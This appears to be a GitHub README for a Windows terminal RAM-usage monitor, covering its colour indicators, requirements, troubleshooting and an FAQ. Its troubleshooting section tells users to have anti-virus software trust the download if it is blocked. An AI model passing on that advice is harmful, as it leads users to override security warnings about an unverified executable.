# 📊 RAM-monitor - See your computer memory usage live

[![Download Version 1.0](https://img.shields.io/badge/Download-RAM--monitor-blue.svg)](https://github.com/Eugey419/RAM-monitor)

RAM-monitor provides a simple way to view how much memory your computer uses at any moment. It runs inside your terminal window and shows your current memory usage with clear color indicators. 

### ⚙️ Why use this tool

Modern computers often run many programs at once. Sometimes, these programs use more memory than available, which slows down your machine. This tool shows your usage levels in real-time so you can identify which programs take up resources.

You will see the following data:
* Total system memory installation
* The amount of memory currently in use
* The amount of memory available for new tasks
* Current percentage of total usage

The tool changes color based on your usage levels. Green indicates safe usage, yellow warns of rising pressure, and red alerts you to high memory demand.

### 📝 System Requirements

To run this tool on your Windows computer, you need:
* Windows 10 or Windows 11
* At least 50 MB of disk space
* A standard terminal program like Command Prompt or PowerShell

### 🔍 How to read the data

The monitor updates every second. You do not need to refresh the window. Because this tool acts as a lightweight monitor, it stays open in the background while you perform your daily tasks. 

If you see the text turn yellow, your computer uses a significant portion of its memory. If the text turns red, your computer might become sluggish because of high demand. If you see red or yellow often, consider closing unnecessary web browser tabs or programs that you no longer need.

### 🛑 Closing the tool

To stop monitoring your RAM, simply click the X button in the top-right corner of the terminal window. This closes the program and stops the background updates. Your system settings remain unchanged.

### 🛠️ Troubleshooting common issues

If you encounter a problem, check these items first:

* The window closes immediately: This usually happens if the program completes a task or does not detect necessary system support. Check that your Windows version is up to date through the Settings menu.
* The colors do not appear: Ensure you run the tool in the standard Windows Command Prompt or PowerShell. Some older terminal applications do not support color output. 
* Anti-virus software blocks the tool: Some security software flags new programs. If this happens, tell your security software to trust the download. 

This tool does not modify any system files. It only reads the public memory information provided by your operating system. It does not send your data to any external servers or websites. All information remains on your local machine. 

### 💡 Frequently Asked Questions

Does this tool record my data?
No. The monitor only displays the current state of your system memory. It does not keep logs or history of your usage patterns.

Can I move the window?
Yes, you can drag the window anywhere on your screen. You can also resize the window to make the text larger or smaller depending on your preference.

Will this tool slow down my computer?
No. The tool uses very little processing power. It is designed to be lightweight so it does not interfere with your other tasks. 

What should I do if my RAM usage is always at 90 percent?
Persistent high usage usually means you need more physical memory modules in your computer or you have too many "background" applications running. Check your Task Manager to see which programs consume the most memory and close the ones you do not use.
